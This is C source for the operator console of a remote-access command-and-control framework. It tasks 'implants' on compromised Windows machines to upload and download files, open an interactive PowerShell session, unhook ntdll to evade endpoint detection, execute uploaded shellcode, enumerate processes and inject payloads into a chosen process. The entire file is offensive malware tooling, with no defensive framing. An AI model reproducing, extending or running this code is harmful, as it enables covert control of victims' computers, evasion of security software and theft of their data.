#include<stdio.h>
#include<conio.h>

#include "tremont.h"

#include "../transport/transport.h"
#include "../endpoint/endpoint.h"
#include "../jobs/jobs.h"
#include "../cli/cli.h"
#include "../ctrl.h"


void _random_bytes_gen(char* buf, size_t buf_len) {
	for (size_t i = 0; i < buf_len; i++) {
		buf[i] = rand() % 256;
	}
}

int _req_new_thread(endpoint_id_t endpoint_id,
					tremont_stream_id* new_stream,
					struct bleeddial_ctx_t* ctx) {
	Tremont_Nexus* nexus = ctx->transport_pcb->nexus;
	tremont_stream_id ctrl_stream = 0;

	EnterCriticalSection(&ctx->endpoint_db_cs);
	ctrl_stream = ctx->endpoint_db
		->endpoints_by_id[endpoint_id].ctrl_stream_id;
	LeaveCriticalSection(&ctx->endpoint_db_cs);

	tremont_stream_id stream_id;
	tremont_newid_nexus(new_stream, nexus);
	stream_id = *new_stream;

	struct ctrl_msg_t new_thread_ctrl_msg;
	new_thread_ctrl_msg.msg_enum = NEW_THREAD;
	
	struct new_thread_msg_t* new_thread_msg;
	new_thread_msg = &new_thread_ctrl_msg.new_thread;

	new_thread_msg->new_thread_enum = T_REQ;
	new_thread_msg->stream_info.stream_id = stream_id;
	_random_bytes_gen(new_thread_msg->stream_info.password,
		STREAM_PASS_LEN);

	tremont_auth_stream(stream_id,
		new_thread_msg->stream_info.password,
		STREAM_PASS_LEN,
		nexus
	);

	tremont_send(ctrl_stream, (byte*)&new_thread_ctrl_msg,
		sizeof(struct ctrl_msg_t), nexus);

	tremont_accept_stream(stream_id, 0, nexus);

	return 0;
}

int _est_upload_thread(endpoint_id_t endpoint_id,
				char* remote_path,
				size_t remote_path_len,
				int64_t file_len,
				tremont_stream_id* stream_id_ptr,
				struct bleeddial_ctx_t* ctx) {
	/*
		Have _req_new_thread create the worker thread
		Send wrkr_msg_t::download::req over the new stream
		recv the response on the same thread
		pass execution to the main thread function
	*/
	Tremont_Nexus* nexus = ctx->transport_pcb->nexus;

	tremont_stream_id upload_stream;

	_req_new_thread(endpoint_id,
		stream_id_ptr,
		ctx
	);
	upload_stream = *stream_id_ptr;

	struct wrkr_msg_t req;
	memset(&req, 0, sizeof(req));
	req.msg_enum = UPLOAD;

	struct upload_msg_t* upload_msg;
	upload_msg = &req.upload;
	upload_msg->msg_enum = REQ;

	struct upload_req_t* upload_req;
	upload_req = &upload_msg->req;

	memcpy(upload_req->dest_path, remote_path, remote_path_len);
	upload_req->dest_path_len = remote_path_len;
	upload_req->file_len = file_len;

	tremont_send(upload_stream, (byte*)&req, sizeof(req), nexus);
	
	struct wrkr_msg_t res;
	tremont_recv(upload_stream, (byte*) & res, sizeof(res), nexus);

	return res.upload.res.allowed == 1 ? 0 : -1;
}

DWORD WINAPI thread_upload(struct upload_params_t* params) {
	char alias_buf[255];
	int res = -1;

	EnterCriticalSection(&params->ctx->endpoint_db_cs);
	res = endpoint_id_alias(alias_buf,
							sizeof(alias_buf),
							params->endpoint_id,
							params->ctx->endpoint_db
	);
	LeaveCriticalSection(&params->ctx->endpoint_db_cs);
	if (res == -1)
		printf("Starting upload to implant %d...\n",
			params->endpoint_id);
	else
		printf("Starting upload to %s (%d)...\n",
			alias_buf,
			params->endpoint_id);

	HANDLE file_handle;
	file_handle = CreateFileA(params->local_path,
		GENERIC_READ,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	if (file_handle == INVALID_HANDLE_VALUE) {
		printf("Can't access file on local machine\n");
		return -1;
	}

	int64_t file_len;
	GetFileSizeEx(file_handle, (PLARGE_INTEGER)&file_len);

	tremont_stream_id upload_stream;
	res = _est_upload_thread(params->endpoint_id,
		params->remote_path,
		params->remote_path_len,
		file_len,
		&upload_stream,
		params->ctx
	);
	if (res == -1) {
		printf("Not allowed to create file on endpoint\n");
		return -1;
	}

	BOOL can_read = FALSE;
	int64_t total_sent = 0;
	int read_from_file = 0;
	char temp_buf[255];

	while (total_sent < file_len) {
		ReadFile(file_handle,
			temp_buf,
			sizeof(temp_buf),
			&read_from_file,
			NULL
		);
		tremont_send(
			upload_stream,
			temp_buf,
			read_from_file,
			params->ctx->transport_pcb->nexus
		);
		total_sent += read_from_file;
	}
	printf("Upload complete!\n");
	
	CloseHandle(file_handle);
	free(params);
	return 0;
}

int64_t _est_download_thread(endpoint_id_t endpoint_id,
	char* remote_path,
	size_t remote_path_len,
	tremont_stream_id* stream_id_ptr,
	struct bleeddial_ctx_t* ctx) {

	Tremont_Nexus* nexus = ctx->transport_pcb->nexus;

	tremont_stream_id download_stream;

	_req_new_thread(endpoint_id,
		stream_id_ptr,
		ctx
	);
	download_stream = *stream_id_ptr;

	struct wrkr_msg_t req;
	memset(&req, 0, sizeof(req));
	req.msg_enum = DOWNLOAD;

	struct download_msg_t* download_msg;
	download_msg = &req.download;
	download_msg->msg_enum = REQ;

	struct download_req_t* download_req;
	download_req = &download_msg->req;

	memcpy(download_req->path, remote_path, remote_path_len);
	download_req->path_len = remote_path_len;

	tremont_send(download_stream, (byte*)&req, sizeof(req), nexus);

	struct wrkr_msg_t res;
	tremont_recv(download_stream, (byte*)&res, sizeof(res), nexus);

	return res.download.res.file_len;
}

DWORD WINAPI thread_download(struct download_params_t* params) {
	char alias_buf[255];
	int res = -1;

	EnterCriticalSection(&params->ctx->endpoint_db_cs);
	res = endpoint_id_alias(alias_buf,
		sizeof(alias_buf),
		params->endpoint_id,
		params->ctx->endpoint_db
	);
	LeaveCriticalSection(&params->ctx->endpoint_db_cs);
	if (res == -1)
		printf("Starting download from implant %d...\n",
			params->endpoint_id);
	else
		printf("Starting download from %s (%d)...\n",
			alias_buf,
			params->endpoint_id);

	int64_t file_size;
	tremont_stream_id download_stream;
	file_size = _est_download_thread(params->endpoint_id,
		params->remote_path,
		params->remote_path_len,
		&download_stream,
		params->ctx
	);
	if (file_size == -1) {
		printf("File not found on remote machine\n");
		return -1;
	}

	HANDLE file_handle;
	file_handle = CreateFileA(params->local_path,
		GENERIC_WRITE,
		FILE_SHARE_READ,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	if (res == 0) {
		printf("Not allowed to create file on local machine\n");
		return -1;
	}

	Tremont_Nexus* nexus = params->ctx->transport_pcb->nexus;

	BOOL can_read = FALSE;
	int64_t total_recvd = 0;

	int recvd = 0;
	int written = 0;
	char temp_buf[255];

	tremont_opts_stream(download_stream, OPT_NONBLOCK, 1, nexus);

	while (total_recvd < file_size) {
		recvd = tremont_recv(download_stream,
			(byte*)temp_buf, sizeof(temp_buf), nexus);
		WriteFile(file_handle, temp_buf, recvd, &written, 0);
		total_recvd += recvd;
	}
	printf("download complete!\n");

	CloseHandle(file_handle);

	struct wrkr_msg_t msg;
	tremont_recv(download_stream, (byte*)&msg, sizeof(msg), nexus);

	memset(&msg, 0, sizeof(msg));
	msg.msg_enum = DOWNLOAD;
	msg.download.msg_enum = FAK;
	msg.download.fak.sanity = 1;

	tremont_send(download_stream, (byte*)&msg, sizeof(msg), nexus);

	free(params);
	return 0;
}

int _est_powershell_stream(endpoint_id_t endpoint_id,
						   tremont_stream_id* stream_id_ptr,
						   struct bleeddial_ctx_t* ctx) {
	/*
		Have _req_new_thread create the worker thread
		Send wrkr_msg_t::download::req over the new stream
		recv the response on the same thread
		pass execution to the main thread function
	*/
	Tremont_Nexus* nexus = ctx->transport_pcb->nexus;

	tremont_stream_id powershell_stream;

	_req_new_thread(endpoint_id,
		stream_id_ptr,
		ctx
	);
	powershell_stream = *stream_id_ptr;

	struct wrkr_msg_t req;
	memset(&req, 0, sizeof(req));
	req.msg_enum = POWERSHELL;

	struct powershell_msg_t* pwrsh_msg;
	pwrsh_msg = &req.powershell;
	pwrsh_msg->msg_enum = REQ;

	struct powershell_req_t* pwrsh_req;
	pwrsh_req = &pwrsh_msg->req;
	pwrsh_req->sanity = 1;

	tremont_send(powershell_stream, (byte*)&req, sizeof(req), nexus);

	struct wrkr_msg_t res;
	tremont_recv(powershell_stream, (byte*)&res, sizeof(res), nexus);

	return res.powershell.res.allowed == 1 ? 0 : -1;
}

int sync_powershell(struct powershell_params_t* params) {
	struct bleeddial_ctx_t* ctx = params->ctx;

	Tremont_Nexus* nexus = ctx->transport_pcb->nexus;
	endpoint_id_t endpoint_id = params->endpoint_id;

	tremont_stream_id stream;
	int res = _est_powershell_stream(endpoint_id,
									 &stream,
									 ctx);
	if (res == -1) {
		printf("Couldn't establish a Powershell session");
	}

	tremont_opts_stream(stream, OPT_NONBLOCK, 1, nexus);

	char temp_input[255];
	char temp_recv[256]; //extra byte for null byte
	int cur_char = 0;
	int input_len = 0;

	while (1) {
		memset(temp_recv, 0, sizeof(temp_recv));
		
		if (tremont_poll_stream(stream, nexus) == -1) break;
		
		if (tremont_recv(stream, temp_recv,
			sizeof(temp_recv) - 1, nexus) == -1) break;
		
		printf("%s", temp_recv);

		if (_kbhit()) {
			cur_char = getchar();

			if (cur_char == '\n') {
				temp_input[0] = '\r';
				temp_input[1] = '\n';
				temp_input[2] = 0;
				tremont_send(stream, temp_input, 2, nexus);
				continue;
			}

			temp_input[0] = (char)cur_char;
			fgets(temp_input + 1, sizeof(temp_input), stdin);
			
			input_len = (int)strlen(temp_input);
			tremont_send(stream, temp_input, input_len, nexus);

			memset(temp_input, 0, input_len);
		}
	}

	tremont_end_stream(stream, nexus);
	
	EnterCriticalSection(&ctx->cli_info_cs);
	
	ctx->cli_info->cli_state = TONE;
	ctx->cli_info->guest_shell = NULL;
	ctx->cli_info->guest_shell_params = NULL;

	LeaveCriticalSection(&ctx->cli_info_cs);

	free(params);
	return 0;
}

int _est_unhookl_thread(endpoint_id_t endpoint_id,
	tremont_stream_id* stream_id_ptr,
	struct bleeddial_ctx_t* ctx) {

	Tremont_Nexus* nexus = ctx->transport_pcb->nexus;

	tremont_stream_id unhookl_stream;

	_req_new_thread(endpoint_id,
		stream_id_ptr,
		ctx
	);
	unhookl_stream = *stream_id_ptr;

	struct wrkr_msg_t req;
	memset(&req, 0, sizeof(req));
	req.msg_enum = UNHOOK_L;

	struct unhookl_msg_t* unhookl_msg;
	unhookl_msg = &req.unhookl;
	unhookl_msg->msg_enum = REQ;

	struct unhookl_req_t* unhookl_req;
	unhookl_req = &unhookl_msg->req;
	unhookl_req->sanity = 1;

	tremont_send(unhookl_stream, (byte*)&req, sizeof(req), nexus);

	struct wrkr_msg_t res;
	tremont_recv(unhookl_stream, (byte*)&res, sizeof(res), nexus);

	return res.unhookl.res.allowed == 1 ? 0 : -1;
}

DWORD WINAPI thread_unhookl(struct unhookl_params_t* params) {
	char alias_buf[255];
	int res = -1;

	EnterCriticalSection(&params->ctx->endpoint_db_cs);
	res = endpoint_id_alias(alias_buf,
		sizeof(alias_buf),
		params->endpoint_id,
		params->ctx->endpoint_db
	);
	LeaveCriticalSection(&params->ctx->endpoint_db_cs);
	if (res == -1)
		printf("Requesting local unhooking from implant %d...\n",
			params->endpoint_id);
	else
		printf("Requesting local unhooking from %s (%d)...\n",
			alias_buf,
			params->endpoint_id);

	tremont_stream_id unhookl_stream;
	res = _est_unhookl_thread(params->endpoint_id,
		&unhookl_stream,
		params->ctx
	);

	Tremont_Nexus* nexus = params->ctx->transport_pcb->nexus;

	struct wrkr_msg_t msg;
	tremont_recv(unhookl_stream, (byte*)&msg, sizeof(msg), nexus);

	memset(&msg, 0, sizeof(msg));
	msg.msg_enum = UNHOOK_L;
	msg.unhookl.msg_enum = FAK;
	msg.unhookl.fak.sanity = 1;

	tremont_send(unhookl_stream, (byte*)&msg, sizeof(msg), nexus);
	
	EnterCriticalSection(&params->ctx->endpoint_db_cs);
	res = endpoint_id_alias(alias_buf,
		sizeof(alias_buf),
		params->endpoint_id,
		params->ctx->endpoint_db
	);
	LeaveCriticalSection(&params->ctx->endpoint_db_cs);
	if (res == -1)
		printf("Implant %d unhooked!\n",
			params->endpoint_id);
	else
		printf("%s (%d) unhooked!\n",
			alias_buf,
			params->endpoint_id);
	
	free(params);
	return 0;
}

int _est_unhook_byon_thread(endpoint_id_t endpoint_id,
	int64_t file_len,
	tremont_stream_id* stream_id_ptr,
	struct bleeddial_ctx_t* ctx) {

	Tremont_Nexus* nexus = ctx->transport_pcb->nexus;

	tremont_stream_id unhook_byon_stream;

	_req_new_thread(endpoint_id,
		stream_id_ptr,
		ctx
	);
	unhook_byon_stream = *stream_id_ptr;

	struct wrkr_msg_t req;
	memset(&req, 0, sizeof(req));
	req.msg_enum = UNHOOK_BYON;

	struct unhookbyon_msg_t* unhook_byon_msg;
	unhook_byon_msg = &req.unhookbyon;
	unhook_byon_msg->msg_enum = REQ;

	struct unhookbyon_req_t* unhook_byon_req;
	unhook_byon_req = &unhook_byon_msg->req;

	unhook_byon_req->file_len = file_len;

	tremont_send(unhook_byon_stream, (byte*)&req, sizeof(req), nexus);

	struct wrkr_msg_t res;
	tremont_recv(unhook_byon_stream, (byte*)&res, sizeof(res), nexus);

	return res.unhookbyon.res.allowed == 1 ? 0 : -1;
}

DWORD WINAPI thread_unhookbyon(struct unhookbyon_params_t* params) {
	char alias_buf[255] = { 0 };
	int res = -1;

	EnterCriticalSection(&params->ctx->endpoint_db_cs);
	res = endpoint_id_alias(alias_buf,
		sizeof(alias_buf),
		params->endpoint_id,
		params->ctx->endpoint_db
	);
	LeaveCriticalSection(&params->ctx->endpoint_db_cs);
	if (res == -1)
		printf("Uploading ntdll to implant %d...\n",
			params->endpoint_id);
	else
		printf("Uploading ntdll to %s (%d)...\n",
			alias_buf,
			params->endpoint_id);

	HANDLE file_handle;
	file_handle = CreateFileA(params->local_path,
		GENERIC_READ,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	if (file_handle == INVALID_HANDLE_VALUE) {
		printf("Can't access file on local machine\n");
		return -1;
	}

	int64_t file_len;
	GetFileSizeEx(file_handle, (PLARGE_INTEGER)&file_len);

	tremont_stream_id unhook_byon_stream;
	res = _est_unhook_byon_thread(params->endpoint_id,
		file_len,
		&unhook_byon_stream,
		params->ctx
	);
	if (res == -1) {
		printf("Couldn't allocate enough memory on implant\n");
		return -1;
	}

	BOOL can_read = FALSE;
	int64_t total_sent = 0;
	int read_from_file = 0;
	char temp_buf[255];

	while (total_sent < file_len) {
		ReadFile(file_handle,
			temp_buf,
			sizeof(temp_buf),
			&read_from_file,
			NULL
		);
		tremont_send(
			unhook_byon_stream,
			temp_buf,
			read_from_file,
			params->ctx->transport_pcb->nexus
		);
		total_sent += read_from_file;
	}
	printf("Upload complete!\n");

	struct wrkr_msg_t msg;
	tremont_recv(unhook_byon_stream, (byte*)&msg,
		sizeof(msg), params->ctx->transport_pcb->nexus);

	if (alias_buf[0] == 0)
		printf("Implant %d starting to unhook...\n",
			params->endpoint_id);
	else
		printf("%s (%d) starting to unhook...\n",
			alias_buf,
			params->endpoint_id);

	tremont_recv(unhook_byon_stream, (byte*)&msg,
		sizeof(msg), params->ctx->transport_pcb->nexus);
	
	memset(&msg, 0, sizeof(msg));
	msg.msg_enum = UNHOOK_BYON;
	msg.unhookbyon.fak.sanity = 1;
	tremont_send(unhook_byon_stream, (byte*)&msg,
		sizeof(msg), params->ctx->transport_pcb->nexus);

	if (alias_buf[0] == 0)
		printf("Implant %d unhooked!\n",
			params->endpoint_id);
	else
		printf("%s (%d) unhooked!\n",
			alias_buf,
			params->endpoint_id);

	CloseHandle(file_handle);
	free(params);
	return 0;
}

int _est_runcode_thread(endpoint_id_t endpoint_id,
	int64_t file_len,
	tremont_stream_id* stream_id_ptr,
	struct bleeddial_ctx_t* ctx) {

	Tremont_Nexus* nexus = ctx->transport_pcb->nexus;

	tremont_stream_id stream;

	_req_new_thread(endpoint_id,
		stream_id_ptr,
		ctx
	);
	stream = *stream_id_ptr;

	struct wrkr_msg_t req;
	memset(&req, 0, sizeof(req));
	req.msg_enum = RUN_CODE;

	struct runcode_msg_t* runcode_msg;
	runcode_msg = &req.runcode;
	runcode_msg->msg_enum = REQ;

	struct runcode_req_t* runcode_req;
	runcode_req = &runcode_msg->req;

	runcode_req->file_len = file_len;

	tremont_send(stream, (byte*)&req, sizeof(req), nexus);

	struct wrkr_msg_t res;
	tremont_recv(stream, (byte*)&res, sizeof(res), nexus);

	return res.runcode.res.allowed == 1 ? 0 : -1;
}

DWORD WINAPI thread_runcode(struct runcode_params_t* params) {
	char alias_buf[255] = { 0 };
	int res = -1;

	EnterCriticalSection(&params->ctx->endpoint_db_cs);
	res = endpoint_id_alias(alias_buf,
		sizeof(alias_buf),
		params->endpoint_id,
		params->ctx->endpoint_db
	);
	LeaveCriticalSection(&params->ctx->endpoint_db_cs);
	if (res == -1)
		printf("Uploading shellcode to implant %d...\n",
			params->endpoint_id);
	else
		printf("Uploading shellcode to %s (%d)...\n",
			alias_buf,
			params->endpoint_id);

	HANDLE file_handle;
	file_handle = CreateFileA(params->local_path,
		GENERIC_READ,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	if (file_handle == INVALID_HANDLE_VALUE) {
		printf("Can't access file on local machine\n");
		return -1;
	}

	int64_t file_len;
	GetFileSizeEx(file_handle, (PLARGE_INTEGER)&file_len);

	tremont_stream_id stream;
	res = _est_runcode_thread(params->endpoint_id,
		file_len,
		&stream,
		params->ctx
	);
	if (res == -1) {
		printf("Couldn't allocate enough memory on implant\n");
		return -1;
	}

	BOOL can_read = FALSE;
	int64_t total_sent = 0;
	int read_from_file = 0;
	char temp_buf[255];

	while (total_sent < file_len) {
		ReadFile(file_handle,
			temp_buf,
			sizeof(temp_buf),
			&read_from_file,
			NULL
		);
		tremont_send(
			stream,
			temp_buf,
			read_from_file,
			params->ctx->transport_pcb->nexus
		);
		total_sent += read_from_file;
	}
	printf("Upload complete!\n");

	struct wrkr_msg_t msg;
	tremont_recv(stream, (byte*)&msg,
		sizeof(msg), params->ctx->transport_pcb->nexus);

	if (alias_buf[0] == 0)
		printf("Implant %d executing shellcode...\n",
			params->endpoint_id);
	else
		printf("%s (%d) executing shellcode...\n",
			alias_buf,
			params->endpoint_id);

	tremont_recv(stream, (byte*)&msg,
		sizeof(msg), params->ctx->transport_pcb->nexus);

	memset(&msg, 0, sizeof(msg));
	msg.msg_enum = RUN_CODE;
	msg.runcode.fak.sanity = 1;
	tremont_send(stream, (byte*)&msg,
		sizeof(msg), params->ctx->transport_pcb->nexus);

	if (alias_buf[0] == 0)
		printf("Shellcode executed on Implant %d!\n",
			params->endpoint_id);
	else
		printf("Shellcode executed on %s (%d)!\n",
			alias_buf,
			params->endpoint_id);

	CloseHandle(file_handle);
	free(params);
	return 0;
}

int _est_pst32_thread(endpoint_id_t endpoint_id,
					  tremont_stream_id* stream_id_ptr,
					  struct bleeddial_ctx_t* ctx) {

	Tremont_Nexus* nexus = ctx->transport_pcb->nexus;

	tremont_stream_id stream;

	_req_new_thread(endpoint_id,
		stream_id_ptr,
		ctx
	);
	stream = *stream_id_ptr;

	struct wrkr_msg_t req;
	memset(&req, 0, sizeof(req));
	req.msg_enum = PS_T32;

	struct pst32_msg_t* pst32_msg;
	pst32_msg = &req.pst32;
	pst32_msg->msg_enum = REQ;

	struct pst32_req_t* pst32_req;
	pst32_req = &pst32_msg->req;

	tremont_send(stream, (byte*)&req, sizeof(req), nexus);

	struct wrkr_msg_t res;
	tremont_recv(stream, (byte*)&res, sizeof(res), nexus);

	return res.pst32.res.proc_count;
}

DWORD WINAPI thread_pst32(struct pst32_params_t* params) {
	uint32_t proc_count;
	struct wrkr_msg_t msg;
	tremont_stream_id stream;
	struct _pst32_proc_t* procs;

	printf("Requesting Tlhelp32 process enumeration...\n");

	proc_count = _est_pst32_thread(params->endpoint_id,
		&stream,
		params->ctx
	);

	if (proc_count == 0) {
		printf("Unable to enumerate processes!\n");
	}

	procs = calloc(proc_count, sizeof(*procs));
	if (!procs) {
		printf("Couldn't allocate memory for procs!\n");
		goto END;
	}
	
	tremont_recv(stream, (byte*)procs, proc_count * sizeof(*procs), 
		params->ctx->transport_pcb->nexus);

	printf("Exe name          PID\n");
	for (int i = 0; i < proc_count; i++)
		wprintf(L"%s          %d\n", procs[i].exe_name, 
			procs[i].proc_id);

END:
	tremont_recv(stream, (byte*)&msg,
		sizeof(msg), params->ctx->transport_pcb->nexus);

	memset(&msg, 0, sizeof(msg));
	msg.msg_enum = PS_T32;
	msg.runcode.fak.sanity = 1;
	tremont_send(stream, (byte*)&msg,
		sizeof(msg), params->ctx->transport_pcb->nexus);

	free(procs);
	free(params);
	return 0;
}

int _est_inject_thread(endpoint_id_t endpoint_id,
	int64_t file_len,
	uint32_t pid,
	tremont_stream_id* stream_id_ptr,
	struct bleeddial_ctx_t* ctx) {

	Tremont_Nexus* nexus = ctx->transport_pcb->nexus;

	tremont_stream_id stream;

	_req_new_thread(endpoint_id,
		stream_id_ptr,
		ctx
	);
	stream = *stream_id_ptr;

	struct wrkr_msg_t req;
	memset(&req, 0, sizeof(req));
	req.msg_enum = INJECT;

	struct inject_msg_t* inject_msg;
	inject_msg = &req.inject;
	inject_msg->msg_enum = REQ;

	struct inject_req_t* inject_req;
	inject_req = &inject_msg->req;

	inject_req->file_len = file_len;
	inject_req->pid = pid;

	tremont_send(stream, (byte*)&req, sizeof(req), nexus);

	struct wrkr_msg_t res;
	tremont_recv(stream, (byte*)&res, sizeof(res), nexus);

	return res.inject.res.allowed == 1 ? 0 : -1;
}

DWORD WINAPI thread_inject(struct inject_params_t* params) {
	char alias_buf[255] = { 0 };
	int res = -1;

	EnterCriticalSection(&params->ctx->endpoint_db_cs);
	res = endpoint_id_alias(alias_buf,
		sizeof(alias_buf),
		params->endpoint_id,
		params->ctx->endpoint_db
	);
	LeaveCriticalSection(&params->ctx->endpoint_db_cs);
	if (res == -1)
		printf("Uploading payload to implant %d...\n",
			params->endpoint_id);
	else
		printf("Uploading payload to %s (%d)...\n",
			alias_buf,
			params->endpoint_id);

	HANDLE file_handle;
	file_handle = CreateFileA(params->local_path,
		GENERIC_READ,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	if (file_handle == INVALID_HANDLE_VALUE) {
		printf("Can't access file on local machine\n");
		return -1;
	}

	int64_t file_len;
	GetFileSizeEx(file_handle, (PLARGE_INTEGER)&file_len);

	tremont_stream_id stream;
	res = _est_inject_thread(params->endpoint_id,
		file_len,
		params->target_pid,
		&stream,
		params->ctx
	);
	if (res == -1) {
		printf("Couldn't allocate enough memory on implant\n");
		return -1;
	}

	BOOL can_read = FALSE;
	int64_t total_sent = 0;
	int read_from_file = 0;
	char temp_buf[255];

	while (total_sent < file_len) {
		ReadFile(file_handle,
			temp_buf,
			sizeof(temp_buf),
			&read_from_file,
			NULL
		);
		tremont_send(
			stream,
			temp_buf,
			read_from_file,
			params->ctx->transport_pcb->nexus
		);
		total_sent += read_from_file;
	}
	printf("Upload complete!\n");

	struct wrkr_msg_t msg;
	tremont_recv(stream, (byte*)&msg,
		sizeof(msg), params->ctx->transport_pcb->nexus);

	if (alias_buf[0] == 0)
		printf("Implant %d injecting payload...\n",
			params->endpoint_id);
	else
		printf("%s (%d) injecting payload...\n",
			alias_buf,
			params->endpoint_id);

	tremont_recv(stream, (byte*)&msg,
		sizeof(msg), params->ctx->transport_pcb->nexus);

	memset(&msg, 0, sizeof(msg));
	msg.msg_enum = INJECT;
	msg.inject.fak.sanity = 1;
	tremont_send(stream, (byte*)&msg,
		sizeof(msg), params->ctx->transport_pcb->nexus);

	if (alias_buf[0] == 0)
		printf("Payload injected on Implant %d!\n",
			params->endpoint_id);
	else
		printf("Payload injected on %s (%d)!\n",
			alias_buf,
			params->endpoint_id);

	CloseHandle(file_handle);
	free(params);
	return 0;
}